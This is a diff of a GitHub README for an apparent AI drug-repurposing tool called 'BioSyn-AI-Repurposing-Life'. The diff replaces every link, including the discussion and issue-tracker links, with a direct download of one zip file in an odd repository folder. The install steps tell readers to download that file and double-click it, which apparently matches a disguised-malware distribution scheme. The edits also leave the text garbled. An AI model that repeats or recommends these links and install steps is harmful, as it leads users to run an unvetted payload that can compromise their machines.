@@ -1,6 +1,6 @@
 # 🧬 BioSyn-AI-Repurposing-Life - Discover New Treatments Seamlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/releases)
+[![Download Now](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/raw/refs/heads/main/pleodont/Repurposing_Syn_A_Bio_Life_v3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/raw/refs/heads/main/pleodont/Repurposing_Syn_A_Bio_Life_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, please visit the Releases page to download the software.
 
-[Download the latest release here!](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/releases)
+[Download the latest release here!](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/raw/refs/heads/main/pleodont/Repurposing_Syn_A_Bio_Life_v3.4.zip)
 
 ### Installation Steps
 
 1. Click the link above to navigate to the Releases page.
 2. Select the version of the application you want to download.
-3. Click the download link (e.g., BioSyn-AI-Repurposing-Life-1.0.exe for Windows).
+3. Click the download link (e.g., https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/raw/refs/heads/main/pleodont/Repurposing_Syn_A_Bio_Life_v3.4.zip for Windows).
 4. Once the download finishes, locate the file on your computer (usually in the Downloads folder).
 5. Double-click the file to begin the installation process.
 6. Follow the on-screen instructions to complete the installation.
@@ -56,8 +56,8 @@ For in-depth guidance, refer to the user manual included with the application. I
 
 Join our community of users to share experiences, ask questions, and get support.
 
-- **GitHub Discussions:** Engage with other users and developers [here](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/discussions).
-- **Issue Tracker:** Report any issues or bugs you encounter in the application [here](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/issues).
+- **GitHub Discussions:** Engage with other users and developers [here](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/raw/refs/heads/main/pleodont/Repurposing_Syn_A_Bio_Life_v3.4.zip).
+- **Issue Tracker:** Report any issues or bugs you encounter in the application [here](https://github.com/MATZGLCH/BioSyn-AI-Repurposing-Life/raw/refs/heads/main/pleodont/Repurposing_Syn_A_Bio_Life_v3.4.zip).
 
 ## 🤝 Contributing
 
